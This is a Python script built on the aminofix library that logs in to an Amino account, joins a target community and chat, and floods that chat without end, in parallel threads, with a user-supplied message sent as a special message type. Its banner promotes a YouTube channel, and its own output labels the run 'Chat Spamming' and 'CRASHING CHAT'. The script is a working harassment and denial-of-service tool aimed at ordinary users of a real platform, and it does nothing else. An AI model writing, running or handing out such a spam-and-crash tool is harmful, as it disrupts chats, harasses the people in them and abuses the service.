import aminofix
import concurrent.futures
from os import system, sys
from time import sleep
import threading
from colorama import Fore

print("\t\033[1;31m Chat Spamming\n\n")
animation = '''


                Subscribes to :  https://youtube.com/c/KWELATEYOURPIZZA


 $$\   $$\                        $$\ 
$$ | $$  |                       $$ |
$$ |$$  /$$\  $$\  $$\  $$$$$$\  $$ |
$$$$$  / $$ | $$ | $$ |$$  __$$\ $$ |
$$  $$<  $$ | $$ | $$ |$$$$$$$$ |$$ |
$$ |\$$\ $$ | $$ | $$ |$$   ____|$$ |
$$ | \$$\\$$$$$\$$$$  |\$$$$$$$\ $$ |
\__|  \__|\_____\____/  \_______|\__|
                                     
                                   
            $$\               
           $$ |              
 $$$$$$\ $$$$$$\    $$$$$$\  
 \____$$\\_$$  _|  $$  __$$\ 
 $$$$$$$ | $$ |    $$$$$$$$ |
$$  __$$ | $$ |$$\ $$   ____|
\$$$$$$$ | \$$$$  |\$$$$$$$\ 
 \_______|  \____/  \_______|
                             
                                 
                                        
$$\   $$\  $$$$$$\  $$\   $$\  $$$$$$\  
$$ |  $$ |$$  __$$\ $$ |  $$ |$$  __$$\ 
$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ |  \__|
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      
\$$$$$$$ |\$$$$$$  |\$$$$$$  |$$ |      
 \____$$ | \______/  \______/ \__|      
$$\   $$ |                              
\$$$$$$  |                              
 \______/                         
 
          $$\                              
          \__|                             
 $$$$$$\  $$\ $$$$$$$$\ $$$$$$$$\ $$$$$$\  
$$  __$$\ $$ |\____$$  |\____$$  |\____$$\ 
$$ /  $$ |$$ |  $$$$ _/   $$$$ _/ $$$$$$$ |
$$ |  $$ |$$ | $$  _/    $$  _/  $$  __$$ |
$$$$$$$  |$$ |$$$$$$$$\ $$$$$$$$\\$$$$$$$ |
$$  ____/ \__|\________|\________|\_______|
$$ |                                       
$$ |                                       
\__|     
        
        
     '''
for x in animation:
	print(Fore.CYAN + x, end ='')
	sys.stdout.flush()
	sleep(0.0008)


email=input("•°•°•°• email >> ")
password=input("°•°•°•°• password >> ")
Target_Chat = input("°•°•°•°• Target Chat >> ")

client = aminofix.Client()
client.login(email=email,password=password)
#client.login_sid(SID=sid)
print("\nLogged in...")

fok=client.get_from_code(Target_Chat)
id=fok.objectId
comid=fok.path[1:fok.path.index("/")]
client.join_community(comId=comid)
print("\033[1;93mJoining Community")
subclient=aminofix.SubClient(comId=comid,profile=client.profile)
subclient.join_chat(chatId=id)
print("\033[1;32mJoined the Chat")
content=input("°•°•°•°• Your Spam Message >> ")
print()
def crash(chatroom):

    subclient.send_message(chatId=id,message=content,messageType=109)
    print("CRASHING CHAT•••••", content)
def thread():
    with concurrent.futures.ThreadPoolExecutor() as executor:
        _=[executor.submit(crash,id) for _ in range(10)]
while True:
    thread()
    
if __name__ == "__main__":
    main()
